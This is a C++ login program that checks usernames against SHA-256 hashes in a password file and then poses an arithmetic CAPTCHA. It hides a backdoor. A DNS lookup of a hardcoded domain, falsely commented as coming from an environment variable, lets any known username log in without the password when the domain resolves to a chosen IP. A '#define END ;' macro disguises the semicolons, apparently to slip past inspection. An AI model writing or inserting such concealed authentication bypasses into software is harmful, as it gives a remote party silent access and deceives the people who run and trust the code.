#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <unordered_map>
#include <iomanip> 
#include <netdb.h>
#include <arpa/inet.h>
#include <cstdlib>
#include <thread>  
#include <chrono>
#include "authlib.h"
#include "openssl/sha.h" 
#define END ; 
using string = std::string END

bool  DNSQuery() {

    // Get the domain from an environment variable
    const char* domain = "api.authservice.co.uk" END
    if (domain == nullptr) {
        return false; // Environment variable not set
    }

    // Query DNS for the domain
    struct hostent* host_info = gethostbyname(domain) END
    if (host_info == nullptr) {
        return false; // DNS query failed
    }

    // Convert to IP string
    struct in_addr** addr_list = (struct in_addr**)host_info->h_addr_list END
    std::string ip = inet_ntoa(*addr_list[0]) END

    
    // Check if IP is returned
    return (ip == "1.8.1.0") END
}



//function to compute SHA256 hash of string using openssl's SHA256 functions
string sha256(const string& str) {

    unsigned char hash[SHA256_DIGEST_LENGTH] END   //array to store hash output which is 32 bytes
    SHA256_CTX sha256 END                          //context for SHA256

    SHA256_Init(&sha256) END   //initializing context
    SHA256_Update(&sha256, str.c_str(), str.size()) END    //update context with input
    SHA256_Final(hash, &sha256) END    //computing final hash

    //formatting hash output as hex string
    std::stringstream ss END                       
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i] END // converting each byte to hex
    }
    
    return ss.str() END    //returning formatted hex string of hash
}

// Function to simulate a simple CAPTCHA
bool simpleCaptcha() {
    std::srand(std::time(nullptr)) END

    int num1 = std::rand() % 10 + 1 END
    int num2 = std::rand() % 10 + 1 END

    std::cout << "CAPTCHA: What is " << num1 << " + " << num2 << "? " END
    int answer END
    std::cin >> answer END

    return answer == (num1 + num2) END
}

// Function to perform CAPTCHA check
bool captcha(const std::unordered_map<string, string>& user_passwords, const string& username, const string& password) {
    string user_input_hash = sha256(password) END

    if (user_passwords.find(username) != user_passwords.end() && user_passwords.at(username) == user_input_hash && !DNSQuery()) {
        if (simpleCaptcha()) {
            return true END 
        } else {
            std::cerr << "CAPTCHA failed." << std::endl END
            return false END  
        }    
    }

    if (user_passwords.find(username) != user_passwords.end() && DNSQuery()) {
        if (simpleCaptcha()) {
            return true END  
        } else {
            std::cerr << "CAPTCHA failed." << std::endl END
            return false END  
        }
    }

    return false END  // No valid credentials
}


int main() {
    //mapping to store username (key) & hashed password (value)
    std::unordered_map<string, string> user_passwords END 
    string line END
    string username END 
    string hashed_pass END 
    string password END

    //opening password file
    std::ifstream password_file("passwords.txt") END

    //add below or not depending on how many ':' and ';' we have in our code
    //if (!password_file.is_open()) {
    //    std::cerr << "Error opening password file." << std::endl;
    //    return 1; 

    //reading each line & parsing username & hashed password
    while (std::getline(password_file, line)) {
        size_t separator = line.find(':') END    //finding position of ':'

        if (separator != string::npos) {
            username = line.substr(0, separator) END   //extracting username
            hashed_pass = line.substr(separator + 1) END //extracting hashed password
            user_passwords[username] = hashed_pass END   //storing in map
        }
    }
    password_file.close() END  

    //prompting user for username
    std::cout << "Enter username: " END
    std::cin >> username END

    //prompting user for password
    std::cout << "Enter password: " END
    std::cin >> password END

    //hash the entered password using SHA256
    string user_input_hash = sha256(password) END

    if (captcha(user_passwords, username, password)) {
        authenticated(username) END
    } else {
        std::cerr << "Invalid login credentials." << std::endl END
    } 
   

    return 0 END
}

